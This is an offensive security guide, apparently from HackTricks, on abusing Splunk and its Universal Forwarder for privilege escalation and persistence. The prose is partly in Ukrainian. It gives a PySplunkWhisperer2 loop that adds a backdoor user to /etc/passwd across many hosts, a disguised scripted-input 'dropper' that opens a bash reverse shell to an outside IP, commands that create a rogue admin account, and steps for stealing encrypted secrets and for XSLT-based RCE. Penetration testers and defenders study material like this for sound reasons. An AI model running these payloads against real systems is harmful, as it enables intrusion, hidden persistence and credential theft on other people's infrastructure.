# Splunk LPE and Persistence

{{#include ../../banners/hacktricks-training.md}}

If **enumerating** a machine **internally** or **externally** you find **Splunk running** (usually **8000** for the web UI and **8089** for the management API), valid credentials can often be turned into **code execution** through app installation, scripted inputs, or management actions. If Splunk is running as **root**, that frequently becomes an immediate **privilege escalation**.

If you only need the generic remote attack surface, enumeration, or app-upload RCE path, check:

{{#ref}}
../../network-services-pentesting/8089-splunkd.md
{{#endref}}

If you are **already root** and the Splunk service is not listening only on localhost, you can also steal **Splunk password hashes**, recover **encrypted secrets**, or push a **malicious app** to keep persistence locally or across multiple forwarders.

## Interesting Local Files

When you land on a host running Splunk or Splunk Universal Forwarder, these are usually the most interesting paths:
```bash
export SPLUNK_HOME=/opt/splunk
[ -d /opt/splunkforwarder ] && export SPLUNK_HOME=/opt/splunkforwarder

find "$SPLUNK_HOME/etc" -maxdepth 4 \( -name passwd -o -name authentication.conf -o -name user-seed.conf -o -name inputs.conf -o -name app.conf -o -name serverclass.conf -o -name outputs.conf -o -name splunk.secret \) 2>/dev/null

grep -RniE 'pass4SymmKey|sslPassword|bindDNPassword|clear_password|token' "$SPLUNK_HOME/etc" 2>/dev/null
```
Important artifacts:

- **`$SPLUNK_HOME/etc/passwd`**: локальні Splunk users і password hashes.
- **`$SPLUNK_HOME/etc/auth/splunk.secret`**: key, який використовує Splunk для encrypt secrets, stored у кількох `.conf` files.
- **`$SPLUNK_HOME/etc/system/local/user-seed.conf`**: initial admin bootstrap file; корисний у gold images і provisioning mistakes. Він ігнорується, якщо `etc/passwd` already exists.
- **`$SPLUNK_HOME/etc/apps/*/{default,local}/inputs.conf`**: where scripted inputs commonly enabled.
- **`$SPLUNK_HOME/etc/deployment-apps/`** or **`$SPLUNK_HOME/etc/apps/`**: good places to hide a persistent app or review what is already being distributed.

## Splunk Universal Forwarder Agent Exploit Summary

For further details check [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/). This is just a summary:

**Exploit overview:**
An exploit targeting the Splunk Universal Forwarder (UF) allows attackers with the **agent password** to execute arbitrary code on systems running the agent, potentially compromising a large portion of the environment.

**Why it works:**

- The UF management service is commonly exposed on **TCP 8089**.
- Attackers can authenticate to the API and instruct the forwarder to install a **malicious app bundle**.
- The same primitive can be used locally for **LPE** or remotely for **RCE**.
- Public tooling such as **SplunkWhisperer2** creates the app bundle automatically and can adapt payloads for Linux targets.

**Common ways to recover the password:**

- Cleartext credentials in documentation, scripts, shares, or deployment automation.
- Password hashes inside `$SPLUNK_HOME/etc/passwd` followed by offline cracking.
- Golden images or provisioning leftovers such as `user-seed.conf`.

**Impact:**

- SYSTEM/root-level code execution on each compromised host.
- Deployment of persistent apps, backdoors, or ransomware.
- Disabling or tampering with telemetry before the data is forwarded.

**Example command for exploitation:**
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
**Usable public exploits:**

- [https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2)
- [https://www.exploit-db.com/exploits/46238](https://www.exploit-db.com/exploits/46238)
- [https://www.exploit-db.com/exploits/46487](https://www.exploit-db.com/exploits/46487)

## Persistence via Scripted Inputs or Malicious Apps

Якщо у вас є **filesystem write access** як `root`/`splunk`, або authenticated access для встановлення apps, дуже надійний механізм persistence — це додати **custom app** із **scripted input**. Власна документація Splunk очікує, що scripted inputs будуть розміщені всередині каталогу app і вмикатимуться з `inputs.conf`.

Typical layout:
```bash
/opt/splunk/etc/apps/.linux_audit/
├── bin/check.sh
└── default/inputs.conf
```
Мінімальний `inputs.conf`:
```ini
[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]
disabled = 0
interval = 60
sourcetype = auditd
```
Швидкий Linux dropper:
```bash
APP="$SPLUNK_HOME/etc/apps/.linux_audit"
mkdir -p "$APP/bin" "$APP/default"
printf '#!/bin/bash\nbash -c "bash -i >& /dev/tcp/10.10.14.7/4444 0>&1"\n' > "$APP/bin/check.sh"
printf '[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]\ndisabled = 0\ninterval = 60\n' > "$APP/default/inputs.conf"
chmod +x "$APP/bin/check.sh"
"$SPLUNK_HOME/bin/splunk" restart
```
Примітки:

- Такий самий trick працює на **Universal Forwarder** через `/opt/splunkforwarder/etc/apps/`.
- Attackers часто маскуються, змінюючи легітимний add-on замість створення очевидно malicious app.
- На **deployment server** підкидання malicious app у `deployment-apps/` перетворюється на **fleet-wide persistence**, тому що forwarders опитують, завантажують оновлені apps і часто перезапускаються, щоб застосувати їх.

## Credential Theft and Admin Takeover

Якщо ви можете читати локальні файли Splunk, зазвичай є дві хороші цілі: відновити **Splunk admin access** і відновити **encrypted service credentials**.

### Password hashes and local users

Splunk зберігає local authentication data в `etc/passwd`. Залежно від deployment, cracking цього файла може відновити робочі credentials для web UI та management API.

Якщо у вас уже є валідні **admin** credentials і Splunk використовує свій **native** authentication backend, сам CLI можна використати для persistence:
```bash
"$SPLUNK_HOME/bin/splunk" edit user admin -password 'Winter2026!' -auth admin:'OldPassword!'
"$SPLUNK_HOME/bin/splunk" add user svc_backup -password 'Winter2026!' -role admin -auth admin:'OldPassword!'
```
### `splunk.secret` and encrypted values

Splunk використовує `etc/auth/splunk.secret` для захисту чутливих значень, збережених у кількох файлах конфігурації. Якщо ви можете викрасти і **secret**, і відповідні файли **`.conf`**, ви часто можете відновити або повторно використати:

- спільні секрети forwarder/indexer, такі як `pass4SymmKey`
- паролі приватного ключа TLS, такі як `sslPassword`
- облікові дані LDAP bind, такі як `bindDNPassword`

Це корисно для **lateral movement** навіть тоді, коли пароль адміністратора Splunk сам по собі не піддається crack.

### `user-seed.conf` abuse

`user-seed.conf` використовується лише під час першого запуску або коли `etc/passwd` не існує. Це робить його менш корисним на вже запущеній системі, але дуже цікавим у:

- скомпрометованих шаблонах інсталяції
- container images
- unattended provisioning workflows
- appliances, де Splunk автоматично ініціалізується повторно

У таких випадках підміна `HASHED_PASSWORD`, згенерованого за допомогою `splunk hash-passwd`, дає вам тихий спосіб відновити доступ адміністратора після redeployment.

## Abusing Splunk Queries

Для додаткових деталей дивіться [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis).

Корисна нещодавня technique — це abuse **user-supplied XSLT** у вразливих версіях Splunk Enterprise, щоб перетворити автентифікований акаунт з низькими привілеями на **OS command execution** від імені користувача `splunk`.

Загальний потік:

1. Authenticate to Splunk.
2. Завантажити шкідливий файл **XSL** через функціональність preview/upload.
3. Змусити Splunk відрендерити результати пошуку з цим завантаженим stylesheet із каталогу **dispatch**.
4. Використати XSLT payload, щоб записати файл або запустити execution через search pipeline Splunk (наприклад, досягнувши внутрішньої functionality, такої як `runshellscript`).

Важливий offensive висновок полягає в тому, що цей шлях — це **post-auth RCE без потреби в app upload**. На Linux він зазвичай дає вам акаунт **`splunk`**, що все ще цінно, бо цей користувач часто володіє деревом application, може читати secrets і може розміщувати persistent apps, які переживають втрату shell.

Representative path, який використовується під час exploitation, такий:
```text
/opt/splunk/var/run/splunk/dispatch/<sid>/shell.xsl
```
Якщо Splunk запущено з надмірними привілеями, або якщо користувач `splunk` має доступ до небезпечних скриптів, service units із правом запису чи поганих `sudo` правил, це стає чистим ланцюжком **LPE**.

## References

- [https://advisory.splunk.com/advisories/SVD-2023-1104](https://advisory.splunk.com/advisories/SVD-2023-1104)
- [https://www.huntress.com/blog/beware-of-traitorware-using-splunk-for-persistence](https://www.huntress.com/blog/beware-of-traitorware-using-splunk-for-persistence)
{{#include ../../banners/hacktricks-training.md}}
